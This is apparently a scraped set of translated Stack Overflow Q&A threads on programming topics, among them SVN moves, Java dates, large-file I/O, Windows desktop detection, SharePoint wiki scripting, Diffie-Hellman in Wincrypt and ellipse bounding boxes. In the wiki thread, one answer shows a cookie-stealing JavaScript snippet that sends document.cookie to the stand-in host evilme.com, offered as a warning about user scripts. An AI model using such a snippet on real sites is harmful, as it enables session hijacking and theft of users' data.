从本质上讲，我的情况是我正在从事开发工作，并意识到我想要一个资源目录，它不会成为主要开发重点的一部分，但仍会被版本化（以保存模型等）。所以我想添加一个资源目录和一个实现目录，实现目录是新的根目录。您将如何将所有先前的目录结构移动到实现目录中？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-09-17T21:11:06.743

如果你使用一些用于 SVN 的 GUI，你可以很容易地做到这一点。当我在 Windows 中工作时，我个人喜欢[TortoiseSVN 。](http://tortoisesvn.tigris.org/)您只需打开“存储库浏览器”，右键单击某个文件夹，然后选择“移动...”。或者，您可以选择直接从 Windows 资源管理器中执行此操作，使用鼠标右键拖动要移动的文件/文件夹，当您将它们放到新位置时，您将获得一个菜单，其中一个选项是“在 SVN 中移动”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-17T21:09:22.317

颠覆中的移动是通过删除旧文件并添加新文件来完成的，因此没有什么特别的事情要做。在另一个问题中推荐的循环中的一系列“svn mv”命令应该可以正常工作。

# java - 在 Java 中操作日期和时间戳的最佳方法是什么？

> ID：87676
> 
> 赞同：21
> 
> 时间：2008-09-17T21:07:44.630
> 
> 标签：java, datetime

每次我需要在 Java 中使用日期和/或时间戳记时，我总是觉得自己做错了什么，并花费无数时间试图找到一种更好的使用 API 的方法，而无需编写自己的日期和时间实用程序类. 这是我刚刚遇到的一些烦人的事情：

*   基于 0 的月份。我意识到最佳做法是使用 Calendar.SEPTEMBER 而不是 8，但令人讨厌的是 8 代表 9 月而不是 8 月。

*   获取没有时间戳的日期。我总是需要将日期的时间戳部分清零的实用程序。

*   我知道我过去还遇到过其他问题，但不记得了。随时在您的回复中添加更多内容。

所以，我的问题是……如果有的话，您使用哪些第三方 API 来简化 Java 对日期和时间操作的使用？对使用[Joda](http://www.joda.org/joda-time/)有什么想法吗？有人仔细研究过 JSR-310 日期和时间 API 吗？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2015-10-29T03:58:56.583

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2008-09-17T21:16:00.820

[这篇文章](http://mike-java.blogspot.com/2008/02/java-date-time-api-vs-joda.html)对比较 Java 日期/时间 API 与 JODA 进行了很好的讨论。

我个人只是在需要在 Java 中操作日期/时间的任何时候使用[公历](http://docs.oracle.com/javase/8/docs/api/java/util/GregorianCalendar.html)和[SimpleDateFormat 。](http://docs.oracle.com/javase/8/docs/api/java/text/SimpleDateFormat.html)我在使用 Java API 时从来没有真正遇到过任何问题，并且发现它很容易使用，所以还没有真正研究过任何替代方案。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2008-09-17T21:58:31.747

Apache Commons Lang 项目有一个`DateUtils`执行有用的日期操作的类。

我使用`DateUtils.truncate()`了很多，它会为你“清零”日期的部分（如果你希望你的 Date 对象代表一个日期而不包括任何时间信息，这很有帮助）。每种方法都适用于对象`Date`和`Calendar`对象。

[http://commons.apache.org/lang/](http://commons.apache.org/lang/)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2008-09-18T00:41:15.770

我已经专门使用 Joda 三年了，并且肯定会推荐它 - 它的整个区域都覆盖着一个界面，可以“按它说的做”。

当您开始时，Joda 可能看起来很复杂，例如它具有看起来有点相似的周期、持续时间和间隔的概念，但您可以通过在代码中替换`org.joda.time.DateTime`(或`org.joda.time.DateMidnight`)`java.util.Date`并坚持使用许多有用的方法来开始类包含，在了解其他领域之前。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-09-17T21:15:06.017

我使用 GregorianCalendar - 随时随地。简单的 java.util.Date 太复杂了，是的。

所以，我的建议是 - 使用 GC，它很简单

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2008-09-17T21:22:11.320

在javascript中也是一样的。当有人认为让 2008 表示 2008 年、31 表示该月的第 31 天以及 - 这是最好的部分 - 11 表示第 12 个月是一个好主意时，他们一定是在抽烟。

另一方面，他们在三分之二的情况下做对了。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-09-17T21:26:25.427

Java 最让我着迷的是日期时间库。我从未使用过 Joda，只是简单地看一下，看起来它是一个非常好的实现，如果我正确理解 JSR-130，它会从 Joda 获取知识并最终将其包含在 JavaSE 中。

对于过去的项目，我经常包装 Java 日期时间对象，这本身就是一项艰巨的任务。然后使用包装器进行日期操作。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-09-17T21:11:23.700

日期 API 很难设计，尤其是当它们必须处理本地化时。试着自己动手看看，至少值得做一次。Joda 能够做得如此出色的事实是对其开发人员的真正功劳。为了回答你的问题，我只听说过关于那个图书馆的好东西，虽然我自己从来没有玩过它。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-09-17T21:15:24.970

许多程序员从使用 Date 开始，它有许多不推荐使用的重载构造函数（使其难以使用），但是一旦你弄清楚 GregorianCalendar，它就会变得更容易管理。这里的例子很有帮助：

[http://java.sun.com/j2se/1.4.2/docs/api/java/util/GregorianCalendar.html](http://java.sun.com/j2se/1.4.2/docs/api/java/util/GregorianCalendar.html)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-09-17T21:33:16.283

编写自己的日期 API 非常简单，它位于原始 Java 类 Date 和 Calendar 之上。基本上，日期和日历都受到他们试图将两个概念塞进一个类的事实的影响：

1.  日期（即年-月-日）
2.  即时（即 currentTimeMillis）

当您理解这一点时，它将彻底改变您在代码中处理类似日期的概念的方式。事情会变得更简单、更清晰、更好。各种意义上！

对我来说，Joda 过于复杂，至少对于绝大多数目的而言，我特别不喜欢他们违背标准 Java 表单的事实，一个例子是他们如何解析和格式化日期。JODA 背后的人 Stephen Colebourne 是 JSR-310 的规范负责人，这也遇到了同样的问题，恕我直言（过去几年我一直关注并参与了讨论）。

自己做; 这简单。只需填写以下类：MyDate（包装年-月-日）、Month（枚举）、TimeOfDay（小时-分-秒-毫秒）、DayOfWeek（枚举）、Instant（包装长）。在即时和日期之间转换时始终考虑时区。

如果这看起来令人生畏，您可以在后台使用 Calendar 和 SimpleDateFormat。你会在一天内做到这一点，永远不会后悔。

# java - 处理大数据量的建议

> ID：87679
> 
> 赞同：7
> 
> 时间：2008-09-17T21:08:12.367
> 
> 标签：java, loading, large-files, large-data-volumes

所以我有一个“大量”的“非常大”的数字数据 ASCII 文件（总共千兆字节），我的程序需要至少按顺序处理整个文件一次。

关于存储/加载数据的任何建议？我曾考虑将文件转换为二进制文件以使它们更小并加快加载速度。

我应该一次将所有内容都加载到内存中吗？
如果不是，那么打开部分加载数据的好方法是什么？
有哪些与 Java 相关的效率提示？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-09-18T13:59:08.973

> 那么，如果处理需要在多个文件和多个缓冲区的数据中跳转怎么办？二进制文件的不断打开和关闭会变得昂贵吗？

*我是'memory mapped i/o' 的*忠实粉丝，也就是*'direct byte buffers'*。在 Java 中，它们被称为 **[映射字节缓冲区](http://docs.oracle.com/javase/8/docs/api/java/nio/MappedByteBuffer.html)**，是 java.nio 的一部分。（基本上，这种机制使用操作系统的虚拟内存分页系统来“映射”您的文件并以编程方式将它们呈现为字节缓冲区。操作系统将自动神奇且非常快速地管理将字节移入/移出磁盘和内存。

我推荐这种方法是因为 a) 它对我有用，b) 它可以让你专注于你的算法，让 JVM、操作系统和硬件来处理性能优化。总而言之，他们比我们卑微的程序员更了解什么是最好的。;)

您将如何在您的上下文中使用 MBB？只需为您的每个文件创建一个 MBB 并在您认为合适的时候阅读它们。您只需要存储您的结果。.

顺便说一句：您正在处理多少数据，以 GB 为单位？如果它超过 3-4GB，那么这将不适用于 32 位机器，因为 MBB 实现是平台架构可寻址内存空间的被告。64 位机器和操作系统将带您到 1TB 或 128TB 的可映射数据。

如果您正在考虑性能，那么请了解 Kirk Pepperdine（一位颇有名气的 Java 性能大师）。他参与了一个网站 www.JavaPerformanceTuning.com，其中包含更多 MBB 详细信息：**[NIO Performance Tips](http://www.javaperformancetuning.com/tips/nio.shtml#REF1)**和其他与 Java 性能相关的内容。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-18T07:00:23.363

您可能想查看[Wide Finder 项目](http://www.tbray.org/ongoing/When/200x/2007/09/20/Wide-Finder)中的条目（在 Google 上搜索[“wide finder” java](http://www.google.com.au/search?q=)）。

Wide finder 涉及读取日志文件中的大量行，因此请查看 Java 实现，看看哪些在那里有效，哪些无效。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T21:21:20.027

您可以转换为二进制，但是如果您需要保留原始数据，那么您将拥有 1+ 个数据副本。

在原始 ascii 数据之上构建某种索引可能是切实可行的，这样如果您需要再次浏览数据，您可以在以后更快地完成它。

按顺序回答您的问题：

> 我应该一次将所有内容都加载到内存中吗？

如果没有，就不会。对于某些文件，您也许可以，但如果您只是按顺序处理，只需对这些内容进行某种缓冲读取，并在此过程中存储您需要的任何内容。

> 如果不是，那么打开部分加载数据的好方法是什么？

BufferedReaders/etc 是最简单的，尽管您可以深入研究 FileChannel/etc 以使用内存映射 I/O 一次通过数据窗口。

> 有哪些与 Java 相关的效率提示？

这实际上取决于您对数据本身所做的事情！

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-17T21:22:21.583

在没有对正在进行的处理类型有任何额外了解的情况下，以下是我完成类似工作时的一些一般想法。

1.  编写一个应用程序的原型（甚至可能是“扔掉的”），对您的数据集执行一些任意操作。看看它走得有多快。如果你能想到的最简单、最天真的事情是可以接受的快，不用担心！

2.  如果幼稚的方法不起作用，请考虑对数据进行预处理，以便后续运行将在可接受的时间长度内运行。您提到必须在数据集中“跳来跳去”很多。有什么办法可以预处理出来吗？或者，一个预处理步骤可以是生成更多数据 - 索引数据 - 提供有关数据集关键、必要部分的字节精确位置信息。然后，您的主要处理运行可以利用此信息直接跳转到必要的数据。

因此，总而言之，我的方法是立即尝试一些简单的方法，看看性能如何。也许会好起来的。否则，请考虑分多个步骤处理数据，为不频繁的预处理节省最昂贵的操作。

不要“将所有内容加载到内存中”。只需执行文件访问，让操作系统的磁盘页面缓存来决定您何时可以直接从内存中提取内容。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-09-18T14:12:55.353

这在很大程度上取决于文件中的数据。大型大型机长期以来一直在进行顺序数据处理，但它们通常不会对数据使用随机访问。他们只是一次把它拉成一条线，然后在继续之前处理那么多。

对于随机访问，通常最好使用缓存包装器构建对象，这些缓存包装器知道它们需要构建的数据在文件中的什么位置。在需要时，他们会读取这些数据并自行构建。这样，当内存紧张时，您就可以开始杀掉一些东西，而不必担心以后无法取回它。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-17T21:10:55.247

你真的没有给我们足够的信息来帮助你。您是否需要完全加载每个文件才能处理它？或者你可以逐行处理吗？

一次加载整个文件可能会导致性能不佳，即使对于不是非常大的文件也是如此。您最好的选择是定义一个适合您的缓冲区大小，并一次读取/处理缓冲区中的数据。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-17T21:11:55.900

我发现 Informatica 是一个非常有用的数据处理工具。好消息是最近的版本甚至允许 Java 转换。如果您正在处理数 TB 的数据，那么可能是时候购买最好的 ETL 工具了。

我假设你想对这里的处理结果做一些事情，比如把它存储在某个地方。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-09-17T21:12:06.523

如果您的数值数据被定期采样并且您需要进行随机访问，请考虑将它们存储在[四叉树](http://en.wikipedia.org/wiki/Quadtree)中。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-09-17T21:23:41.720

我强烈建议使用正则表达式并查看“新”IO nio 包以加快输入速度。然后它应该以您实际期望的千兆字节数据的速度运行。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-09-18T14:00:46.363

如果可能的话，将数据存入数据库。然后，您可以利用所有可用的索引、缓存、内存固定和其他功能。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-09-19T21:05:40.880

如果您需要多次访问数据，请将其加载到数据库中。大多数数据库都有某种批量加载实用程序。如果数据可以全部放入内存，并且您不需要保留它或经常访问它，您可能可以用 Perl 或您最喜欢的脚本语言编写一些简单的东西。

# c++ - 测试 Windows 应用程序的运行状况

> ID：87689
> 
> 赞同：2
> 
> 时间：2008-09-17T21:09:20.150
> 
> 标签：c++, windows, command-line

我有几个应用程序是我们工作室的各种开发人员使用的一套工具的一部分。这些应用程序主要是打开 DOS cmd shell 的命令行应用程序。这些应用程序依次启动一个 GUI 应用程序，该应用程序跟踪这些命令行应用程序的输出和状态（通过套接字）。

命令行应用程序可以在用户登录、他们的工作站被锁定（他们启动批处理文件然后立即锁定他们的工作站）以及当他们注销（通过计划任务）时启动。我遇到的问题是最后两个案例。

如果在用户被锁定或注销时这些应用程序中的任何一个启动，这些命令将生成跟踪输出/状态的 GUI 窗口。这很好，但是假设用户锁定了他们的工作站——当他们解锁他们的工作站时，GUI 是不可见的。它正在运行任务列表，但不可见。下次这些用户运行我们的一些命令行应用程序时，GUI 不会启动（因为它已经在运行），但是因为它在桌面上不可见，所以用户看不到任何输出。

我正在寻找的是一种从我的命令行应用程序中判断它们是在锁定的工作站后面运行还是在用户注销时（通过计划任务）运行的方法——基本上它们是在没有用户桌面可见的情况下运行的。如果我能说出来，那么我就可以简单地不启动我们的 GUI 并且可以防止很多问题。

我需要测试的这些应用程序是 C/C++ Windows 应用程序。

我希望这是有道理的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-18T13:20:22.700

我找到了我正在寻找的程序化答案。它与车站有关。显然，在桌面上运行的任何东西都将在具有特定名称的工作站上运行。任何不在桌面上的东西（即任务管理器在注销或锁定的工作站上启动的进程）都将以不同的工作站名称启动。示例代码：

```
HWINSTA dHandle = GetProcessWindowStation();
if ( GetUserObjectInformation(dHandle, UOI_NAME, nameBuffer, bufferLen, &lenNeeded) ) {
    if ( stricmp(nameBuffer, "winsta0") ) {
        // when we get here, we are not running on the real desktop
        return false;
   }
} 
```

如果您进入“if”语句，那么您的进程不在桌面上，而是在“其他地方”运行。我在不从桌面运行时查看了 namebuffer 值，名称意义不大，但它们不是 WinSta0。

[链接到此处](http://msdn.microsoft.com/en-us/library/ms681928.aspx)的文档。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-17T21:23:49.757

您也许可以使用 SENS（系统事件通知服务）。我自己从来没有使用过它，但我几乎可以肯定它会做你想做的事：给你通知，比如登录、注销、屏幕保护程序等。

我知道这很模糊，但希望它能让你开始。一个快速的谷歌搜索出现了这个，其中包括：[http ://discoveringdotnet.alexeyev.org/2008/02/sens-events.html](http://discoveringdotnet.alexeyev.org/2008/02/sens-events.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-20T04:10:17.707

我已经成功使用这种方法来检测桌面是否锁定在 Windows 上：

```
bool isDesktopLocked = false;
HDESK inputDesktop = OpenInputDesktop(0, FALSE,
             DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW |
             DESKTOP_ENUMERATE |  DESKTOP_SWITCHDESKTOP |
             DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
             DESKTOP_WRITE);

if (NULL == inputDesktop)
{
    isDesktopLocked = true;
}
else
{
    CloseDesktop(inputDesktop);
} 
```

# javascript - 如何在 wiki 页面中输入 Javascript？

> ID：87692
> 
> 赞同：7
> 
> 时间：2008-09-17T21:09:26.717
> 
> 标签：javascript, html, sharepoint, wiki

作为 wiki 管理员，我如何将脚本 (Javascript) 输入到 Sharepoint wiki 页面？

我想输入一个标题，点击它时，会在它下面显示一个小说明。我通常用javascript做到这一点，还有其他想法吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2008-09-17T21:15:23.287

如果维基作者是明智的，那么可能没有办法做到这一点。

用户贡献的 JavaScript 的问题在于它为所有形式的作恶者打开了从毫无戒心的人那里获取数据的大门。

假设 evil-me 在公共网站上发布了一个脚本：

```
i = new Image();
i.src = 'http://evilme.com/store_cookie_data?c=' + document.cookie; 
```

现在，我将收到每个页面访问者的 cookie 信息，并发布到我的服务器上的日志中。而这只是冰山一角。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2008-09-17T21:32:39.187

假设您是 wiki 的管理员并且愿意在鼠标悬停而不是单击时显示此内容，那么您根本不需要 javascript——您可以直接使用 CSS。这是样式和标记的示例：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
  "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
  <title>Test</title>
  <style type="text/css">
    h1 { padding-bottom: .5em; position: relative; }
    h1 span { font-weight: normal; font-size: small; position: absolute; bottom: 0; display: none; }
    h1:hover span { display: block; }
  </style>
</head>
<body>
  <h1>Here is the title!
    <span>Here is a little explanation</span>
  </h1>
  <p>Here is some page content</p>
</body>
</html> 
```

使用更多涉及的样式，您的工具提示框可以看起来像您想要的一样漂亮。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T21:13:04.930

这完全取决于您使用的特定 Wiki 软件。我见过的工作方式是在其他地方托管一个 js 文件，然后包含一个带有 src 属性的脚本标签。

如果他们不允许这样做，也许他们允许 IFRAME，您可以将其设置为包含脚本的页面。使用第二种技术，您将无法访问主机页面的 DOM。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-18T02:06:57.017

我喜欢 CSS 的答案。当您可以使用 CSS 而不是 Javascript 时，它会导致更简单的标记。
要研究的另一件事是 Codeplex 上 SharePoint 增强 Wiki 版的社区工具包。您可以下载源代码并添加自己的功能。或者您可以在论坛中将此作为新功能提出建议。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2019-06-04T16:09:29.877

# 使用内容编辑器 Web 部件

从功能区中，选择`Insert`并选择`Web Part`。从菜单中，转到`Media and Content`并选择`Content Editor`。从新创建的 webpart 的下拉菜单中，选择`Edit Web Part`. 从右侧 Webpart 设置菜单中，展开`Appearance`并设置`Chrome Type`为`None`. 单击`Click Here to Add Content`web 部件并`Edit HTML Source`在功能区中找到。您可以在此区域中使用 HTML，而无需对其进行清理。

注意：如果您计划向大量页面元素添加行为，您可能希望将 .js 文件上传到样式库并仅`<script src="...">`在内容编辑器中包含标签。您可能还想研究使用自定义母版或页面布局。

来源：[https ://cobwwweb.com/how-to-run-javascript-on-sharepoint-pages](https://cobwwweb.com/how-to-run-javascript-on-sharepoint-pages)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-09-17T21:10:23.797

这听起来像一个安全风险。wiki 管理员似乎可以安装脚本，请参阅[wikipedia's user scripts](http://en.wikipedia.org/wiki/Wikipedia:WikiProject_User_scripts)。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-09-17T21:11:16.540

您应该不能为任何公共 wiki 添加 javascript 代码。如果您自己托管它，那么您需要请求一个特定的 wiki 系统，以便有人可以帮助您修改设置 - 如果该系统可能的话。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-09-17T21:11:37.163

如果您在谈论使用 Javascript 作为本网站网页的一部分，则不能。或任何其他公共维基 - 这是一个安全风险。

如果您要发布代码示例，请单击文本框上方的“101010”按钮。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-09-17T21:11:50.050

当然，这取决于您正在与之交谈的 wiki 引擎。不过，正如 sblundy 所说，最有可能的是，允许在 wiki 页面上免费使用 javascript 会带来安全风险。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2008-09-17T21:14:55.533

添加`title="text here"`到任何标签，悬停在其上时应显示文本。
Internet Explorer 会在您使用该`alt="text here"`属性时显示文本，尽管这不符合标准。

我现在进行了测试，您可以添加`<h2 title="some explanation here">headline</h2>`到任何基于维基媒体（维基百科使用的系统）的系统。

# cryptography - 我正在为 Diffie-Hellman 使用 Wincrypt——我可以以纯文本格式导出共享密钥吗？

> ID：87694
> 
> 赞同：4
> 
> 时间：2008-09-17T21:09:43.097
> 
> 标签：cryptography, cryptoapi, diffie-hellman

好的——感谢[Mike](https://stackoverflow.com/users/6970/mike-dimmick)，我能够让 Wincrypt 生成一个 Diffie-Hellman 密钥对。我想通了导出公钥，以及如何导入对方的公钥。根据文档，在导入对方的公钥后，共享的秘密就被计算出来了。伟大的。

我现在需要掌握那个共享的秘密，但我认为这是不可能的。除非我调用将算法 id 从更改为其他类型，否则只需调用失败`CryptExportKey`类型即可。但我不*想要*别的东西，我想要共享的秘密。然而，API 似乎旨在阻止这种情况。`PLAINTEXTKEYBLOB``CryptSetKeyParam``CALG_AGREEDKEY_ANY`

 *有什么想法吗？我应该注意到这里的问题是我只写了 WiFi 保护设置实现的一个方面。所以协议是为我定义的，对方没有给我HCRYPTKEYs。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-18T23:45:49.953

**This looks like what you need...** from: [http://msdn.microsoft.com/en-us/library/aa381969(VS.85).aspx](http://msdn.microsoft.com/en-us/library/aa381969(VS.85).aspx)

* * *

To import a Diffie-Hellman public key and calculate the secret session key

1.  Call the `CryptAcquireContext` function to get a handle to the Microsoft Diffie-Hellman Cryptographic Provider.
2.  Create a Diffie-Hellman key by calling the `CryptGenKey` function to create a new key, or by calling the `CryptGetUserKey` function to retrieve an existing key.
3.  To import the Diffie-Hellman public key into the CSP, call the `CryptImportKey` function, passing a pointer to the public key BLOB in the `pbData` parameter, the length of the BLOB in the `dwDataLen` parameter, and the handle to the Diffie-Hellman key in the `hPubKey` parameter. This causes the calculation, `(Y^X) mod P`, to be performed, thus creating the shared, secret key and completing the key exchange. This function call returns a handle to the new, secret, session key in the `hKey` parameter.
4.  At this point, the imported Diffie-Hellman is of type `CALG_AGREEDKEY_ANY`. Before the key can be used, it must be converted into a session key type. This is accomplished by calling the `CryptSetKeyParam` function with `dwParam` set to `KP_ALGID` and with `pbData` set to a pointer to a `ALG_ID` value that represents a session key, such as `CALG_RC4`. The key must be converted before using the shared key in the `CryptEncrypt` or `CryptDecrypt` function. Calls made to either of these functions prior to converting the key type will fail.
5.  The secret session key is now ready to be used for encryption or decryption.
6.  When the key is no longer needed, destroy the key handle by calling the `CryptDestroyKey` function.

# cocoa - 在 Mac 上以编程方式在 Cocoa 中流式传输音频

> ID：87695
> 
> 赞同：3
> 
> 时间：2008-09-17T21:09:48.150
> 
> 标签：cocoa, macos, audio, stream

如何在 Mac 上使用 Cocoa 以编程方式创建音频流。比如说，在 Cocoa 应用程序中使用 Mac OSX 上的核心框架制作一个白噪声生成器？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-09-18T06:52:47.547

一种方法是使用[CoreAudio](http://developer.apple.com/documentation/MusicAudio/Reference/CoreAudio/book_intro/chapter_1_section_1.html#//apple_ref/doc/uid/TP30001108-CH201-DontLinkElementID_85) DefaultOutputUnit。

您可以使用输出采样率、分辨率和输出采样格式等参数对其进行配置。然后，您可以以编程方式创建原始声波并将其提供给输出单元。

在您的机器上查看 /Developer/Examples/CoreAudio/SimpleSDK/DefaultOutputUnit/ 上的这个示例

它使用默认输出单元来播放以编程方式渲染的正弦波。以此为起点，您可以编写一个例程来渲染任何其他内容以输出。

/Developer/Examples/CoreAudio/ 的这个位置还包含大量其他核心音频示例。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T21:22:25.873

查看[音频队列服务](http://developer.apple.com/documentation/MusicAudio/Conceptual/AudioQueueProgrammingGuide/Introduction/chapter_1_section_1.html)。

# database - 您如何处理 MS Access 中布尔类型列中的 NULL 值？

> ID：87712
> 
> 赞同：1
> 
> 时间：2008-09-17T21:11:18.770
> 
> 标签：database, ms-access, null, odbc, boolean

我想知道是否有更好的方法来处理 MS-Access 无法处理布尔值的 NULL，而不是将列数据类型更改为整数。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-17T21:33:16.473

[我认为您必须使用数字，因此， Allen Browne, Access MVP](http://allenbrowne.com/tips.html)似乎也是如此。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-17T21:23:29.710

不是我发现 :( 我有一段时间没有对 Access 进行编程，但我记得涉及到很多 isNull 检查。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T21:45:26.117

我认为这取决于您希望您的应用程序/解决方案如何*解释*数据中的 NULL。

您是否想在报告中简单地“忽略”它们......即让它们打印为空格或换行符？在这种情况下，您可以在 SQL 构建器或常规 Access 查询设计器中的列中使用方便的 IsNull 函数以及“立即 if”iif()，如下所示：

IIF(IsNull( *BooleanColumnName* ), *NewLine/BlankSpace/Whatever* , *BooleanColumnName* )

另一方面，如果您想将 NULL 视为“False”值，则最好更新列并使用以下内容更改它们：

Update *table*
SET *BooleanColumnName* = FALSE
其中布尔*列名为*空

# markup - 对人工可编辑数据文件格式/解析库的建议

> ID：87713
> 
> 赞同：2
> 
> 时间：2008-09-17T21:11:23.187
> 
> 标签：markup

例如，现在我有一个自己动手的解决方案，它使用包含以下块的数据文件：

```
PlayerCharacter Fighter
  Hitpoints 25
  Strength 10
  StartPosition (0, 0, 0)
  Art
    Model BigBuffGuy
    Footprint LargeFootprint
  end
  InventoryItem Sword
  InventoryItem Shield
  InventoryItem HealthPotion
end 
```

*   人类可编辑（理想情况下，带有最少的垃圾字符）
*   对错误有弹性（最少的“哇，我不能再解析任何有用的东西”样式错误，因此我丢失了文件其余部分中的所有数据）——但仍然能够识别和报告它们，当然。我的示例唯一完整的失败案例是缺少“结束”。
*   嵌套结构样式数据
*   数组/列表样式数据
*   可定制的基础类型
*   快速地

是否有任何众所周知的解决方案可以满足/超过这些要求？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-09-17T21:12:11.157

Yaml 是一个很好的解决方案，并且非常接近您所拥有的。搜索它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-17T21:14:26.877

我[赞同 YAML](http://www.yaml.org/)的建议。它非常容易编辑，非常容错并且得到广泛支持（尤其是在动态语言中）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T21:15:38.993

我想说最常见的选择是：

1.  [JSON](http://en.wikipedia.org/wiki/Json)（[官方网站](http://www.json.org/)） - 非常灵活，虽然标点符号可能需要一些时间让人们习惯
2.  [INI](http://en.wikipedia.org/wiki/INI_file) - 超级简单易用，但数据类型有点限制
3.  [XML](http://en.wikipedia.org/wiki/XML) - 非常灵活、常见，但有时过于冗长

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T21:16:25.250

您可以在以下位置尝试 JSON：http: [//www.json.org/](http://www.json.org/)

它最初是为 javascript 和 web 使用而设计的。但它非常干净，并且支持多种语言。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T21:18:19.987

[Lua](http://www.lua.org/)被设计为一种编程语言，它的语法让您可以轻松地将其用作标记语言，因此您可以像包含代码一样包含数据文件。许多计算机游戏都使用它来编写脚本，例如魔兽世界，因为它的速度和易用性。然而，它最初是为能源行业设计和维护的，所以有一个严肃的背景。

带有 S 表达式的 Scheme 也是一种非常不错但外观不同的数据语法。最后，您获得了大多数入门级开发人员都知道的 XML。[您还可以使用ANTLR](http://www.antlr.org/)等不错的开发套件推出自己定义明确且高效的解析器。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2008-09-17T21:21:07.373

我建议[JSON](http://www.json.org/)。

*   与 YAML 一样可读/可编辑
*   如果你碰巧用于 Web 则可以 eval()'ed 到 JavaScript 对象中
*   可能和 YAML 一样跨语言

# math - 你如何计算椭圆的轴对齐边界框？

> ID：87734
> 
> 赞同：32
> 
> 时间：2008-09-17T21:13:51.573
> 
> 标签：math, graphics, geometry

如果椭圆的长轴是垂直的或水平的，那么边界框的计算很容易，但是当椭圆旋转时呢？

到目前为止，我能想到的唯一方法是计算周边的所有点并找到最大/最小 x 和 y 值。似乎应该有一个更简单的方法。

如果有一个函数（在数学意义上）以任意角度描述椭圆，那么我可以使用它的导数来找到斜率为零或未定义的点，但我似乎找不到。

**编辑：澄清一下，我需要轴对齐的边界框，即它不应该与椭圆一起旋转，而是与 x 轴保持对齐，因此转换边界框将不起作用。**

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2008-09-17T21:47:13.287

您可以尝试对以任意角度旋转的椭圆使用参数化方程：

```
x = h + a*cos(t)*cos(phi) - b*sin(t)*sin(phi)  [1]
y = k + b*sin(t)*cos(phi) + a*cos(t)*sin(phi)  [2] 
```

...其中椭圆具有中心 (h,k) 长半轴 a 和半短轴 b，并旋转角度 phi。

然后，您可以区分并求解梯度 = 0：

```
0 = dx/dt = -a*sin(t)*cos(phi) - b*cos(t)*sin(phi) 
```

=>

```
tan(t) = -b*tan(phi)/a   [3] 
```

这应该为您提供许多 t 的解决方案（您对其中两个感兴趣），将其重新插入 [1] 以获得您的最大和最小 x。

对 [2] 重复：

```
0 = dy/dt = b*cos(t)*cos(phi) - a*sin(t)*sin(phi) 
```

=>

```
tan(t) = b*cot(phi)/a  [4] 
```

**让我们尝试一个例子：**

考虑一个椭圆 (0,0)，a=2，b=1，旋转 PI/4：

[1] =>

```
x = 2*cos(t)*cos(PI/4) - sin(t)*sin(PI/4) 
```

[3] =>

```
tan(t) = -tan(PI/4)/2 = -1/2 
```

=>

```
t = -0.4636 + n*PI 
```

我们对 t = -0.4636 和 t = -3.6052 感兴趣

所以我们得到：

```
x = 2*cos(-0.4636)*cos(PI/4) - sin(-0.4636)*sin(PI/4) = 1.5811 
```

和

```
x = 2*cos(-3.6052)*cos(PI/4) - sin(-3.6052)*sin(PI/4) = -1.5811 
```

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-01-04T19:15:07.343

[我在http://www.iquilezles.org/www/articles/ellipses/ellipses.htm](http://www.iquilezles.org/www/articles/ellipses/ellipses.htm)找到了一个简单的公式（并忽略了 z 轴）。

我大致是这样实现的：

```
num ux = ellipse.r1 * cos(ellipse.phi);
num uy = ellipse.r1 * sin(ellipse.phi);
num vx = ellipse.r2 * cos(ellipse.phi+PI/2);
